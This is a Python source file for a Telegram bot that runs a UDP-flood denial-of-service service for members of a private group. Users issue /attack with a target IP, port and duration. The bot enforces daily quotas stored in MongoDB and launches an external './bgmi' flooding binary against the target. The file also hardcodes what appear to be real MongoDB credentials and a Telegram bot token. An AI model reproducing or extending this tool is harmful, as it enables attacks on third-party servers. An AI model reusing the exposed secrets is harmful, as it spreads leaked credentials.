import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone
from pymongo import MongoClient

# MongoDB setup
MONGO_URI = "mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv"  # Update with your MongoDB URI
DB_NAME = "udp_flooder"
COLLECTION_NAME = "user_attacks"

client = MongoClient(MONGO_URI)
db = client[DB_NAME]
attack_collection = db[COLLECTION_NAME]

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and group ID
TOKEN = '7931184714:AAH_FkdQnmVH3th14W7BDkpP0LTZ4DLnM_c'  # Replace with your actual bot token
GROUP_ID = '-1002191672918'
CHANNEL_INVITE_LINK = "https://t.me/+lgb92RXeI2E4ZjM1"
bot = telebot.TeleBot(TOKEN)

# Global variables
EXEMPTED_USERS = [1342302666, 7286836587]
COOLDOWN_DURATION = 200
DAILY_ATTACK_LIMIT = 6
current_attacker = None
attack_end_time = None

# Users who confirmed they have joined the channel
joined_users = set()

# Function to get current date in string format
def get_current_date():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d")

# Function to reset daily attack limits in MongoDB
def reset_daily_counts():
    current_date = get_current_date()
    attack_collection.update_many({}, {"$set": {"attacks": 0, "date": current_date}})
    logging.info("Daily attack limits reset.")

# Function to get user attack count from MongoDB
def get_user_attacks(user_id):
    current_date = get_current_date()
    user = attack_collection.find_one({"user_id": user_id})

    if not user or user.get("date") != current_date:
        attack_collection.update_one(
            {"user_id": user_id}, 
            {"$set": {"attacks": 0, "date": current_date}}, 
            upsert=True
        )
        return 0

    return user["attacks"]

# Function to increment user attack count in MongoDB
def increment_user_attacks(user_id):
    attack_collection.update_one(
        {"user_id": user_id},
        {"$inc": {"attacks": 1}, "$set": {"date": get_current_date()}},
        upsert=True
    )

# Handle `/joined` command
@bot.message_handler(commands=['joined'])
def confirm_joined(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    if user_id in joined_users:
        bot.send_message(message.chat.id, f"🎉 **{user_name}**, you've already confirmed your membership in the channel!")
    else:
        joined_users.add(user_id)
        bot.send_message(message.chat.id, f"🎉 **{user_name}**, you've successfully joined the channel and can now use the bot!")

# Attack command
@bot.message_handler(commands=['attack'])
def attack_command(message):
    global current_attacker, attack_end_time

    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    if str(message.chat.id) != GROUP_ID:
        bot.send_message(message.chat.id, "🚨 This bot only works in LEGACY VIP GROUP! 🚨")
        return

    # Check if user has joined the private channel
    if user_id not in joined_users:
        bot.send_message(message.chat.id, f"🚨 You must join the private channel to use this bot. Join here: {CHANNEL_INVITE_LINK}")
        bot.send_message(message.chat.id, "After joining, send `/joined` to access the bot.")
        return

    # Reset daily limits if needed
    reset_daily_counts()

    # Check if another attack is running
    if current_attacker:
        remaining_time = (attack_end_time - datetime.now()).total_seconds() if attack_end_time else 0
        minutes, seconds = divmod(max(remaining_time, 0), 60)
        bot.send_message(message.chat.id, f"⚠️ {user_name}, another user is attacking. Wait {int(minutes)}m {int(seconds)}s.")
        return

    # Check attack limits
    if user_id not in EXEMPTED_USERS:
        user_attacks = get_user_attacks(user_id)

        if user_attacks >= DAILY_ATTACK_LIMIT:
            bot.send_message(message.chat.id, f"🚫 {user_name}, you've reached your daily attack limit. Try again tomorrow!")
            return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("⚙️ Usage: `/attack <target_ip> <target_port> <duration>`")

        target_ip, target_port, user_duration = args

        if not target_ip.count('.') == 3 or not all(i.isdigit() and 0 <= int(i) <= 255 for i in target_ip.split('.')):
            raise ValueError("❌ Invalid IP address.")
        if not target_port.isdigit() or not (0 <= int(target_port) <= 65535):
            raise ValueError("❌ Invalid port number.")
        if not user_duration.isdigit() or int(user_duration) <= 0:
            raise ValueError("❌ Duration must be a positive number.")

        # Increment attack count
        if user_id not in EXEMPTED_USERS:
            increment_user_attacks(user_id)

        current_attacker = user_id
        attack_duration = 120
        attack_end_time = datetime.now() + timedelta(seconds=attack_duration)

        bot.send_message(
            message.chat.id,
            f"🚀 **{user_name}, attack initiated!**\n\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"⏳ Duration: {attack_duration}s\n\n"
            "⚡ **Stay tuned for results!**"
        )

        asyncio.run(run_attack_command_async(target_ip, int(target_port), attack_duration, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_name):
    global current_attacker, attack_end_time

    try:
        command = f"./bgmi {target_ip} {target_port} {duration} {350} {60}"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()

        bot.send_message(GROUP_ID, f"✅ **Attack completed on `{target_ip}:{target_port}`!**")

    except Exception as e:
        bot.send_message(GROUP_ID, f"❌ Error executing attack: {e}")

    finally:
        current_attacker = None
        attack_end_time = None

if __name__ == "__main__":
    logging.info("Bot is running...")
    bot.polling(none_stop=True)
